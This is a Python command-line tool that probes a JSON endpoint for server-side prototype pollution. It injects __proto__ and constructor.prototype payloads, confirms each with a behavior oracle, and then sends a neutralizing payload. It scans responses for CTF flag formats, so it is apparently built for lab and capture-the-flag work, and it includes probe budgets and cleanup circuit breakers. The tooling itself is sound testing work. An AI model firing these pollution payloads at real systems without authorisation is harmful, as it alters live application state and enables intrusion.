#!/usr/bin/env python3
"""ssppquick.py — bounded server-side prototype-pollution source detector.

Start from one known-valid JSON update request. The helper injects one paired,
behavior-nullifying oracle at one existing object level at a time, observes the
framework behavior, sends the matching neutralizer in a ``finally`` path, and
requires the behavior to revert before reporting a confirmed source.

The neutralizer turns off the selected gadget; it cannot delete a property from
Object.prototype. On a shared target, treat a failed cleanup check as a circuit
breaker and restart the lab before sending any other pollution payload.

Exit codes: 0 confirmed source or flag found, 2 no confirmed source/inconclusive,
3 request, gateway, rate-limit, or cleanup circuit breaker, 4 invalid arguments.
"""
import argparse
import copy
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}',
    re.I)
STATUS_BODY_RE = re.compile(r'"statusCode"\s*:\s*510\b', re.I)
BLITZ_RE = re.compile(
    r'Immutable.{1,10}prototype.{1,10}object|Cannot.{1,10}read.{1,10}'
    r'properties.{1,10}of.{1,10}(?:undefined|null)', re.I | re.S)
GATEWAY_FAILURES = {502, 503, 504}
CANARY = "f1e3f7a9"
SENSITIVE_KEY_RE = re.compile(r'pass|secret|token|cookie|authorization|api[_-]?key', re.I)

ORACLES = {
    "status": ({"status": 510}, {"status": 0}),
    "spacing": ({"json spaces": " "}, {"json spaces": ""}),
    "options": ({"head": True}, {"head": False}),
    "exposed-headers": ({"exposedHeaders": [CANARY]}, {"exposedHeaders": None}),
    "blitz": ({"__proto__": {}}, {"__proto__": "xyz"}),
}


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def redact(value):
    if isinstance(value, dict):
        return {
            key: "<redacted>" if SENSITIVE_KEY_RE.search(str(key)) else redact(item)
            for key, item in value.items()
        }
    if isinstance(value, list):
        return [redact(item) for item in value]
    return value


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def pointer_escape(value):
    return str(value).replace("~", "~0").replace("/", "~1")


def pointer(path):
    return "/" if not path else "/" + "/".join(pointer_escape(part) for part in path)


def pointer_parts(value):
    if value in ("", "/"):
        return ()
    if not value.startswith("/"):
        raise ValueError("--path must be a JSON Pointer such as /profile/settings")
    return tuple(part.replace("~1", "/").replace("~0", "~")
                 for part in value[1:].split("/"))


def object_paths(value, path=()):
    paths = []
    if isinstance(value, dict):
        paths.append(path)
        for key, item in value.items():
            paths.extend(object_paths(item, path + (key,)))
    elif isinstance(value, list):
        for index, item in enumerate(value):
            paths.extend(object_paths(item, path + (index,)))
    return paths


def resolve(value, path):
    current = value
    for part in path:
        if isinstance(current, list):
            try:
                part = int(part)
            except (TypeError, ValueError):
                raise ValueError("JSON Pointer %s does not name an array index" % pointer(path))
        try:
            current = current[part]
        except (KeyError, IndexError, TypeError):
            raise ValueError("JSON Pointer does not exist: %s" % pointer(path))
    if not isinstance(current, dict):
        raise ValueError("JSON Pointer does not name an object: %s" % pointer(path))
    return current


def injected_body(baseline, path, form, inner):
    body = copy.deepcopy(baseline)
    target = resolve(body, path)
    if form == "proto":
        if "__proto__" in target:
            raise ValueError("object %s already contains __proto__" % pointer(path))
        target["__proto__"] = copy.deepcopy(inner)
    else:
        if "constructor" in target:
            raise ValueError("object %s already contains constructor" % pointer(path))
        target["constructor"] = {"prototype": copy.deepcopy(inner)}
    return body


def json_gap(text):
    """Return indentation before the first JSON member, or None for compact/non-JSON."""
    try:
        json.loads(text)
    except (TypeError, ValueError):
        return None
    stripped = text.lstrip("\ufeff \t\r\n")
    lines = stripped.splitlines()
    if len(lines) < 2 or not lines[0].rstrip().endswith(("{", "[")):
        return None
    for line in lines[1:]:
        if not line.strip() or line.lstrip().startswith(("}", "]")):
            continue
        return line[:len(line) - len(line.lstrip(" \t"))]
    return None


def allow_methods(response):
    return {item.strip().upper() for item in response.headers.get("Allow", "").split(",")
            if item.strip()}


def status_signal(response):
    return response.status_code == 510 or bool(STATUS_BODY_RE.search(response.text or ""))


def exposed_signal(response):
    return CANARY in response.headers.get("Access-Control-Expose-Headers", "").lower()


def blitz_signal(response):
    return bool(BLITZ_RE.search(response.text or ""))


class SsppFastTrack:
    def __init__(self, args, baseline_data):
        self.args = args
        self.baseline_data = baseline_data
        self.session = requests.Session()
        self.headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        }
        if args.token:
            self.headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.headers["Cookie"] = args.cookie
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            self.headers[key.strip()] = value.strip()
        self.count = 0
        self.confirmed = None
        self.cleanup_verified = True
        self.flags = []
        self.skips = []
        self.truncated = False
        os.makedirs(args.out, exist_ok=True)
        self.responses_dir = os.path.join(args.out, "responses")
        os.makedirs(self.responses_dir, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")
        self.summary_path = os.path.join(args.out, "summary.json")

    def _record(self, label, method, url, request_body, response):
        safe_label = re.sub(r"[^A-Za-z0-9_.-]+", "_", label).strip("_") or "probe"
        record = {
            "label": label,
            "method": method,
            "url": url,
            "request_body": redact(request_body),
        }
        if isinstance(response, Exception):
            record["error"] = repr(response)
        else:
            record.update({
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": (response.text or "")[:12000],
            })
            response_path = os.path.join(
                self.responses_dir, "%03d-%s.txt" % (self.count, safe_label))
            with open(response_path, "w", encoding="utf-8") as fh:
                fh.write("HTTP %d\n" % response.status_code)
                for key, value in response.headers.items():
                    fh.write("%s: %s\n" % (key, value))
                fh.write("\n")
                fh.write(response.text or "")
            record["response_file"] = os.path.relpath(response_path, self.args.out)
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def _scan_flag(self, response):
        scan = (response.text or "") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        for hit in FLAG_RE.findall(scan):
            if hit not in self.flags:
                self.flags.append(hit)
                print("FLAG %s" % hit)

    def send(self, label, method, url, payload=None, raw=None, safety=False):
        if not safety and self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        kwargs = {
            "method": method,
            "url": url,
            "headers": self.headers,
            "timeout": self.args.timeout,
            "allow_redirects": False,
            "verify": False,
        }
        request_body = payload if raw is None else raw
        if raw is not None:
            kwargs["data"] = raw
        elif payload is not None and method not in ("GET", "HEAD", "OPTIONS"):
            kwargs["json"] = payload
        try:
            response = self.session.request(**kwargs)
        except requests.RequestException as exc:
            self._record(label, method, url, request_body, exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, method, url, request_body, response)
        budget = "%02d" % self.args.max_probes if self.count <= self.args.max_probes else "cleanup"
        print("[%02d/%s] %-38s HTTP %d %db" % (
            self.count, budget, label, response.status_code, len(response.content)))
        self._scan_flag(response)
        if not safety:
            if response.status_code == 429:
                raise CircuitBreak("429 rate limit during %s" % label)
            if response.status_code in GATEWAY_FAILURES:
                raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response

    def observe(self, label, safety=False):
        payload = self.baseline_data if self.args.probe_method not in (
            "GET", "HEAD", "OPTIONS") else None
        return self.send(label, self.args.probe_method, self.args.probe_url,
                         payload=payload, safety=safety)

    def invalid_json(self, label, safety=False):
        return self.send(label, self.args.probe_method, self.args.probe_url,
                         raw="{", safety=safety)

    def options(self, label, safety=False):
        return self.send(label, "OPTIONS", self.args.probe_url, safety=safety)

    def prerequisite(self, oracle, baseline):
        if oracle == "status":
            response = self.invalid_json("status:baseline-invalid")
            if status_signal(response):
                return None, "baseline already has the 510 status signal"
            return response, None
        if oracle == "spacing":
            response = baseline if self.args.probe_url == self.args.url and \
                self.args.probe_method == self.args.method else self.observe("spacing:baseline")
            gap = json_gap(response.text or "")
            if gap == " ":
                return None, "baseline already uses one-space JSON indentation"
            if not response.headers.get("Content-Type", "").lower().startswith("application/json"):
                try:
                    response.json()
                except ValueError:
                    return None, "probe response is not JSON"
            return response, None
        if oracle == "options":
            response = self.options("options:baseline")
            methods = allow_methods(response)
            if "HEAD" not in methods:
                return None, "baseline Allow header does not advertise HEAD"
            return response, None
        if oracle == "exposed-headers":
            response = baseline if self.args.probe_url == self.args.url and \
                self.args.probe_method == self.args.method else self.observe("exposed:baseline")
            if exposed_signal(response):
                return None, "baseline already exposes the canary header"
            return response, None
        return baseline, None

    def _oracle_observe(self, oracle, phase, safety=False):
        if oracle == "status":
            return self.invalid_json("%s:%s" % (oracle, phase), safety=safety)
        if oracle == "options":
            return self.options("%s:%s" % (oracle, phase), safety=safety)
        if oracle in ("spacing", "exposed-headers"):
            return self.observe("%s:%s" % (oracle, phase), safety=safety)
        return None

    @staticmethod
    def _changed(oracle, response):
        if oracle == "status":
            return status_signal(response)
        if oracle == "spacing":
            return json_gap(response.text or "") == " "
        if oracle == "options":
            methods = allow_methods(response)
            return bool(methods) and "HEAD" not in methods
        if oracle == "exposed-headers":
            return exposed_signal(response)
        if oracle == "blitz":
            return blitz_signal(response)
        return False

    def probe_candidate(self, oracle, form, path):
        attack_inner, neutral_inner = ORACLES[oracle]
        attack_body = injected_body(self.baseline_data, path, form, attack_inner)
        neutral_body = injected_body(self.baseline_data, path, form, neutral_inner)
        stem = "%s:%s:%s" % (oracle, form, pointer(path))
        attack = observed = cleanup = after = None
        attack_error = None
        cleanup_error = None
        attack_attempted = False
        try:
            attack_attempted = True
            attack = self.send(stem + ":attack", self.args.method, self.args.url,
                               payload=attack_body)
            observed = attack if oracle == "blitz" else self._oracle_observe(
                oracle, stem + ":changed")
        except (CircuitBreak, BudgetExhausted, KeyboardInterrupt) as exc:
            attack_error = exc
        finally:
            if attack_attempted:
                try:
                    cleanup = self.send(stem + ":neutralize", self.args.method, self.args.url,
                                        payload=neutral_body, safety=True)
                    if cleanup.status_code == 429 or cleanup.status_code in GATEWAY_FAILURES:
                        raise CircuitBreak(
                            "neutralizer returned HTTP %d" % cleanup.status_code)
                    after = cleanup if oracle == "blitz" else self._oracle_observe(
                        oracle, stem + ":recheck", safety=True)
                    if after.status_code == 429 or after.status_code in GATEWAY_FAILURES:
                        raise CircuitBreak(
                            "post-neutralizer check returned HTTP %d" % after.status_code)
                except (CircuitBreak, KeyboardInterrupt) as exc:
                    cleanup_error = exc

        if cleanup_error:
            self.cleanup_verified = False
            raise CircuitBreak(
                "CLEANUP UNVERIFIED for %s: %s; stop and restart the lab" %
                (stem, cleanup_error))
        changed = observed is not None and self._changed(oracle, observed)
        reverted = after is not None and not self._changed(oracle, after)
        if changed and not reverted:
            self.cleanup_verified = False
            raise CircuitBreak(
                "CLEANUP UNVERIFIED for %s: oracle stayed active; stop and restart the lab" % stem)
        if attack_error:
            raise attack_error
        if changed and reverted:
            self.confirmed = {
                "oracle": oracle,
                "form": "__proto__" if form == "proto" else "constructor.prototype",
                "path": pointer(path),
                "cleanup_behavior_reverted": True,
            }
            print("CONFIRMED SSPP source: oracle=%s form=%s path=%s" % (
                oracle, self.confirmed["form"], pointer(path)))
            print("[+] gadget behavior reverted; inherited neutralizer may remain until restart")
            return True
        print("[-] no paired %s differential at %s %s" % (oracle, form, pointer(path)))
        return False

    def run(self):
        baseline = self.send("baseline", self.args.method, self.args.url,
                             payload=self.baseline_data)
        if not 200 <= baseline.status_code < 300:
            raise Inconclusive(
                "known-valid baseline did not succeed (HTTP %d); fix --data before probing" %
                baseline.status_code)
        if self.flags:
            return

        paths = object_paths(self.baseline_data)
        if self.args.path:
            requested = [pointer_parts(item) for item in self.args.path]
            for path in requested:
                resolve(self.baseline_data, path)
            paths = requested
        if len(paths) > self.args.max_objects:
            self.truncated = True
            paths = paths[:self.args.max_objects]
            print("[!] object-level sweep truncated to %d; use --path or --max-objects" %
                  self.args.max_objects)
        print("[*] object levels: %s" % ", ".join(pointer(path) for path in paths))

        forms = ("proto", "constructor") if self.args.form == "both" else (self.args.form,)
        for oracle in self.args.oracle:
            _, reason = self.prerequisite(oracle, baseline)
            if reason:
                self.skips.append({"oracle": oracle, "reason": reason})
                print("[!] skipping %s oracle: %s" % (oracle, reason))
                continue
            for form in forms:
                for path in paths:
                    try:
                        if self.probe_candidate(oracle, form, path):
                            return
                        if self.flags:
                            return
                    except ValueError as exc:
                        self.skips.append({
                            "oracle": oracle, "form": form, "path": pointer(path),
                            "reason": str(exc),
                        })
                        print("[!] skipping %s %s %s: %s" %
                              (oracle, form, pointer(path), exc))
        reason = "paired oracle sweep found no confirmed source"
        if self.truncated:
            reason += "; object levels were truncated"
        if self.args.form == "proto":
            reason += "; rerun --form constructor if __proto__ may be filtered"
        raise Inconclusive(reason)

    def write_summary(self, outcome, detail=None):
        summary = {
            "outcome": outcome,
            "detail": detail,
            "confirmed": self.confirmed,
            "cleanup_verified": self.cleanup_verified,
            "flags": self.flags,
            "probes": self.count,
            "max_probes": self.args.max_probes,
            "oracles": self.args.oracle,
            "form": self.args.form,
            "skips": self.skips,
            "truncated": self.truncated,
        }
        with open(self.summary_path, "w", encoding="utf-8") as fh:
            json.dump(summary, fh, indent=2, sort_keys=True)
            fh.write("\n")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description=("Confirm a JSON merge sink with paired, behavior-nullifying "
                     "server-side prototype-pollution oracles"))
    parser.add_argument("--url", required=True, help="known-valid JSON merge endpoint")
    data = parser.add_mutually_exclusive_group(required=True)
    data.add_argument("--data", help="known-valid JSON object used as the baseline request")
    data.add_argument("--data-file", help="file containing the known-valid JSON object")
    parser.add_argument("--method", choices=("POST", "PUT", "PATCH"), default="POST")
    parser.add_argument("--probe-url",
                        help="endpoint used for oracle observations (default: --url)")
    parser.add_argument("--probe-method", choices=("GET", "POST", "PUT", "PATCH"),
                        help="method used for observations (default: --method)")
    parser.add_argument("--oracle", action="append",
                        choices=tuple(ORACLES) + ("all",),
                        help="paired oracle; repeatable (default: status)")
    parser.add_argument("--form", choices=("proto", "constructor", "both"), default="proto",
                        help="pollution form (constructor is the filtered-__proto__ fallback)")
    parser.add_argument("--path", action="append", default=[],
                        help="limit injection to a JSON Pointer object path; repeatable")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--out", default="recon/ssppquick", help="evidence directory")
    parser.add_argument("--max-probes", type=int, default=80)
    parser.add_argument("--max-objects", type=int, default=16)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    runner = None
    try:
        if args.data_file:
            with open(args.data_file, encoding="utf-8") as fh:
                baseline_data = json.load(fh)
        else:
            baseline_data = json.loads(args.data)
        if not isinstance(baseline_data, dict):
            raise ValueError("baseline data must decode to a JSON object")
        if args.max_probes < 1 or args.max_objects < 1:
            raise ValueError("--max-probes and --max-objects must be positive")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be nonnegative and --timeout must be positive")
        args.probe_url = args.probe_url or args.url
        args.probe_method = args.probe_method or args.method
        oracles = args.oracle or ["status"]
        args.oracle = list(ORACLES) if "all" in oracles else unique(oracles)
        runner = SsppFastTrack(args, baseline_data)
        runner.run()
        runner.write_summary("confirmed" if runner.confirmed else "flag")
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        if runner:
            runner.write_summary("inconclusive", str(exc))
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except (CircuitBreak, KeyboardInterrupt) as exc:
        if runner:
            runner.write_summary("circuit-breaker", str(exc))
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (OSError, ValueError, TypeError, json.JSONDecodeError) as exc:
        if runner:
            runner.write_summary("invalid-arguments", str(exc))
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
